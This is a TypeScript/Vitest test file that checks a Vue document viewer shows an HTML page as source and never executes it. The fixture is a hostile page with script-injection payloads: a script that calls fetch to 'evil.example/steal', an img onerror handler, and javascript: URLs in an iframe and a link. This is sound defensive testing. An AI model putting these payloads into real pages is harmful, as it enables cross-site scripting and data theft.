import { afterEach, describe, expect, it } from 'vitest'
import CanonicalDocumentViewer from '../../src/renderer/src/components/CanonicalDocumentViewer.vue'
import type { ResourceReading } from '../../src/shared/runtime-ipc'
import { mount, unmountAll } from './harness'

/**
 * 🔴 **635 · `HO-097` §1.3, measured in a browser** — *"Viewing a document never executes its code
 * inside BroBot."*
 *
 * ## ⛔ Why this file and not the node suite
 *
 * ⚠️ **The node suite asserts the renderer's OUTPUT STRING carries no live tag.** ⛔ That is one
 * layer short of the ruling: a string with no `<script` in it can still become a script if
 * something downstream sets it as HTML, and *"a person sees no script"* is a claim about a
 * DOCUMENT, not about a string. ⚑ Here the component is really mounted, the bytes are really in
 * the page, and the question asked is the PO's own: **did anything run?**
 *
 * ## ⚠️ The hazard is on the path the code walks
 *
 * ⛔ **The planted page would set a global and fetch a URL if anything executed it**
 * (`put-the-hazard-on-the-path-the-code-walks`, this dispatch's §1.2). ⚑ Both are observable from
 * the test: a global is read back, and `fetch` is replaced by a counter for the life of the mount.
 * 🔴 **A test that rendered a benign page would prove nothing** — so the control below renders the
 * SAME hostile bytes through the same component and finds the words, which is what makes the
 * silence meaningful rather than empty.
 */

afterEach(unmountAll)

const HOSTILE =
  '<!doctype html>\n' +
  '<h1>World clock</h1>\n' +
  '<script>window.__brobot_owned = true; fetch("https://evil.example/steal")</script>\n' +
  '<img src=x onerror="window.__brobot_owned = true">\n' +
  '<iframe src="javascript:window.__brobot_owned = true"></iframe>\n' +
  '<a href="javascript:window.__brobot_owned = true">press me</a>\n'

const shown = (over: Partial<ResourceReading & { ok: true }> = {}): ResourceReading =>
  ({
    ok: true,
    resourceId: 'res_1d2c3b1a5e6f4a7b8c9d0e1f2a3b4c5d',
    name: '001-response.html',
    form: 'page',
    text: HOSTILE,
    bytes: HOSTILE.length,
    ...over,
  }) as ResourceReading

describe('635 · a page is shown, never run', () => {
  it('🔴 nothing executed — no global was set and no request was made', async () => {
    const owned = () => (globalThis as Record<string, unknown>).__brobot_owned
    delete (globalThis as Record<string, unknown>).__brobot_owned
    const real = globalThis.fetch
    let asked = 0
    globalThis.fetch = (() => {
      asked += 1
      return Promise.reject(new Error('no'))
    }) as typeof fetch

    try {
      const m = mount(CanonicalDocumentViewer, { result: shown() }, { width: 900, height: 700 })
      // ⚠️ **A tick, so anything that was going to run has had the chance.** An `img` `onerror`
      // fires asynchronously, which is exactly why a synchronous assertion would be the weaker one.
      await new Promise((done) => setTimeout(done, 60))

      // ⛔ **The ruling, in two facts.**
      expect(owned(), 'an agent-written script set a global in the window').toBeUndefined()
      expect(asked, 'an agent-written page reached the network').toBe(0)

      // 🔴 **And no element of the page exists in the document at all.**
      expect(m.host.querySelectorAll('script')).toHaveLength(0)
      expect(m.host.querySelectorAll('iframe')).toHaveLength(0)
      expect(m.host.querySelectorAll('img')).toHaveLength(0)
      // ⚑ **The a-href one is the subtlest**: markdown-it's `validateLink` is what refuses a
      // `javascript:` href, and an anchor carrying one would be a press that runs code.
      for (const link of m.host.querySelectorAll('a')) {
        expect(link.getAttribute('href') ?? '').not.toContain('javascript:')
      }

      // ⚠️ **THE CONTROL, on the same mount** — without it every line above is satisfiable by a
      // component that drew nothing at all (`a-positive-assertion-must-differ-from-the-default`).
      const words = (m.host.textContent ?? '').replace(/\s+/g, ' ')
      expect(words).toContain('World clock')
      expect(words).toContain('__brobot_owned')
      expect(words).toContain('<script>')
    } finally {
      globalThis.fetch = real
      delete (globalThis as Record<string, unknown>).__brobot_owned
    }
  })

  it('⛔ a page opens on its SOURCE, and offers no Markdown view of a file that is not Markdown', () => {
    const m = mount(CanonicalDocumentViewer, { result: shown() }, { width: 900, height: 700 })
    expect(m.q('document-body').dataset.view).toBe('raw')
    // ⚑ **The toggle is REMOVED and not merely unselected** — a `Markdown` button over an HTML
    // file promises a rendering of the page, and the only rendering this app can safely give is
    // the source it is already showing.
    expect(m.all('doc-view-markdown')).toHaveLength(0)
    expect(m.all('doc-view-raw')).toHaveLength(1)
  })

  it('⚑ …and a REPORT still opens rendered, with both views — the control for the line above', () => {
    const m = mount(
      CanonicalDocumentViewer,
      { result: shown({ form: 'markdown', name: '001-response.md', text: '# The answer\n' }) },
      { width: 900, height: 700 },
    )
    expect(m.q('document-body').dataset.view).toBe('markdown')
    expect(m.all('doc-view-markdown')).toHaveLength(1)
  })

  it('⚠️ a form this window cannot draw says so, and does not draw an empty document', () => {
    // 🔴 **`an-unenumerated-state-counts-as-success` at the surface most likely to hit it**: a
    // picture has no text, and a viewer that fed `null` to the paper would show a blank page over
    // a document that is perfectly fine.
    const m = mount(
      CanonicalDocumentViewer,
      { result: shown({ form: 'image', name: '002-response.png', text: null }) },
      { width: 900, height: 700 },
    )
    expect(m.all('document-body')).toHaveLength(0)
    const said = m.q('canonical-document-not-drawn').textContent ?? ''
    // ⚑ D-016 · a reply's file is a RESOURCE, kept byte for byte — no registry any more.
    expect(said).toContain('It is kept')
    // ⛔ **It blames the VIEWER and not the file** — `452` §5.1's rule with the noun changed.
    expect(said).not.toContain('could not be opened')
  })

  it('🔴 731 · …and points at no project folder — the kept copy was never there', () => {
    // ⛔ On `main` both sentences ended *"— open the project folder to look at it"*: `HO-097`'s
    // premise, which the PM ruled a habit (`726` §9). The copy is in this app's resources folder.
    for (const [form, name] of [
      ['image', '002-response.png'],
      ['pdf', '003-response.pdf'],
    ] as const) {
      const m = mount(
        CanonicalDocumentViewer,
        { result: shown({ form, name, text: null }) },
        { width: 900, height: 700 },
      )
      const said = m.q('canonical-document-not-drawn').textContent ?? ''
      expect(said, form).toContain('It is kept')
      expect(said, form).not.toMatch(/project folder/i)
      m.unmount()
    }
  })
})
